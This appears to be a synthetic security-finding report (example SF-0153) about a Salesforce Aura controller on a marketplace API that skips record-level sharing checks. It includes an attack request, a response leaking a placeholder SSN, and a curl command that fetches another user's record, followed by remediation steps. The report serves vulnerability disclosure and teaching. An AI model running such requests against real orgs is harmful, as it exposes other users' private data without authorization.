# Security Analysis Report
**System:** ShopGrid Marketplace API (Salesforce-Integrated)
**Domain:** E-Commerce / Marketplace
**Example ID:** SF-0153
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass via `c.CustomObjectController.getRecord` — `without sharing` removes OWD=Private enforcement on CustomRecord objects; SOQL has no ownership predicate |

---

## Finding 1 — Platform: SOQL and Salesforce Record-Level Access Bypass (Pattern 9.2)

### Summary
The Aura controller `c.CustomObjectController.getRecord` on ShopGrid Marketplace API (`378be387.lightning.force.com`) bypasses Salesforce record-level access controls. The `CustomRecordController` (note: Apex class name differs from Aura descriptor) runs `without sharing`, neutralizing OWD=Private on the CustomRecord object. The SOQL has no `AND OwnerId = :UserInfo.getUserId()` predicate and no `WITH SECURITY_ENFORCED`. Per §5.0 Pattern 9.2, any authenticated user can retrieve any CustomRecord by ID.

**Context.txt inconsistency (documented):** §4.0 Apex class is `CustomRecordController.getCustomRecordDetails`, but §5.0 and §6.0 HAR use `c.CustomObjectController.getRecord`. These conflict. The HAR (§6.0) is the primary evidence — `c.CustomObjectController.getRecord` is the authoritative affected Aura descriptor.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.CustomObjectController.getRecord`
**Affected endpoint:** `POST https://378be387.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://378be387.lightning.force.com/aura
Authorization: Bearer 00D378BE387!AR378be387...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D378BE387!AR378be387...

message={
  "actions": [{
    "id": "1;a",
    "descriptor": "c.CustomObjectController.getRecord",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "recordId": "001E387",
      "fields": ["Id", "Name", "OwnerId", "InternalNotes__c", "SensitiveData__c"]
    }
  }]
}
```

**Response — Victim CustomRecord Returned**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001E387",
        "Name": "Victim CustomRecord Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-50-3432"
      }]
    },
    "error": []
  }]
}
```
Victim's SSN `000-50-3432` and internal notes exposed. `OwnerId: 005VICTIM` confirms the record belongs to a different user. SOQL ran `without sharing` — OWD=Private bypassed.

### Steps to Reproduce
1. Authenticate to ShopGrid on `378be387.lightning.force.com` and obtain a valid session token.
2. POST to `/aura` substituting a victim's `recordId`:
```bash
curl -s -X POST "https://378be387.lightning.force.com/aura" \
  -H "Authorization: Bearer 00D378BE387!AR378be387..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: 00D378BE387!AR378be387..." \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CustomObjectController.getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"001E387","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}'
# Vulnerable: returns SensitiveData__c (SSN: 000-50-3432) and InternalNotes__c for victim record 001E387
# Secure: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Permissions"}]}]}
```

### Remediation
1. Declare `CustomRecordController` as `with sharing` to enforce OWD=Private.
2. Add `AND OwnerId = :UserInfo.getUserId()` to SOQL WHERE clause.
3. Add `WITH SECURITY_ENFORCED` to SOQL query.
